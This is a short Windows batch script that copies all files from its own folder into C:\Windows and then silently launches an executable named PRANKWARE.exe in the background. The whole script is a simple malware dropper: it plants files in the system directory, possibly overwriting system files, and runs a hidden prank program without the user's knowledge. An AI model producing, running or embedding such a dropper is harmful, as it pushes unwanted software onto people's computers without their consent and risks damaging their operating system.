@echo off
set "sourceFolder=%~dp0"
for %%A in ("%sourceFolder%\*") do (
    if not "%%~fA"=="%~f0" (
        copy "%%A" "C:\Windows\"
    )
)
cd /d "C:\Windows"
start /b PRANKWARE.exe
exit